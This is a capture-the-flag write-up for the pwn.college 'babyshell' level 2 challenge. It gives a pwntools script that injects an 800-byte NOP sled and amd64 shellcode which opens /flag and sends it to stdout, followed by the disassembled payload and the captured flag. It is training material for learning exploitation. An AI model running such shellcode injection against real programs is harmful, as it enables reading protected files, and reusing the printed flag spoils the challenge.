# Level 2

## Approach

Pretty much the same approach as the previous level, except we needed to add an nop sled of 800 bytes as the challenge mentions.

Script:

``` py 
from pwn import *
p = process("/challenge/babyshell-level-2")
context.arch = 'amd64'

nop_sled = asm('nop') * 800
script = asm(f'''
        mov rbx, 0x00000067616c662f
        push rbx

        mov rax, 2
        mov rdi, rsp
        mov rsi, 0
        syscall

        mov rdi, 1
        mov rsi, rax
        mov rdx, 0
        mov r10, 1000
        mov rax, 40
        syscall

        mov rax, 60
        syscall
''')

p.sendline(nop_sled + script)
p.interactive()
```

Which gave me the flag
```  

0x00007ffe7cf691a4 | 90                                            | nop
0x00007ffe7cf691a5 | 90                                            | nop
0x00007ffe7cf691a6 | 90                                            | nop
0x00007ffe7cf691a7 | 90                                            | nop
0x00007ffe7cf691a8 | 90                                            | nop
0x00007ffe7cf691a9 | 90                                            | nop
0x00007ffe7cf691aa | 90                                            | nop
0x00007ffe7cf691ab | 90                                            | nop
0x00007ffe7cf691ac | 90                                            | nop
0x00007ffe7cf691ad | 90                                            | nop
0x00007ffe7cf691ae | 90                                            | nop
0x00007ffe7cf691af | 90                                            | nop
0x00007ffe7cf691b0 | 48 bb 2f 66 6c 61 67 00 00 00                 | movabs rbx, 0x67616c662f
0x00007ffe7cf691ba | 53                                            | push rbx
0x00007ffe7cf691bb | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x00007ffe7cf691c2 | 48 89 e7                                      | mov rdi, rsp
0x00007ffe7cf691c5 | 48 c7 c6 00 00 00 00                          | mov rsi, 0
0x00007ffe7cf691cc | 0f 05                                         | syscall
0x00007ffe7cf691ce | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x00007ffe7cf691d5 | 48 89 c6                                      | mov rsi, rax
0x00007ffe7cf691d8 | 48 c7 c2 00 00 00 00                          | mov rdx, 0
0x00007ffe7cf691df | 49 c7 c2 e8 03 00 00                          | mov r10, 0x3e8
0x00007ffe7cf691e6 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x00007ffe7cf691ed | 0f 05                                         | syscall
0x00007ffe7cf691ef | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
[*] Process '/challenge/babyshell-level-2' stopped with exit code 1 (pid 224)
0x00007ffe7cf691f6 | 0f 05                                         | syscall

Executing shellcode!

pwn.college{0ICHDVvtLEQfPPOkNm3OYfG7XNa.0FOxIDLzITO0czW}
```

## Flag

`pwn.college{0ICHDVvtLEQfPPOkNm3OYfG7XNa.0FOxIDLzITO0czW}`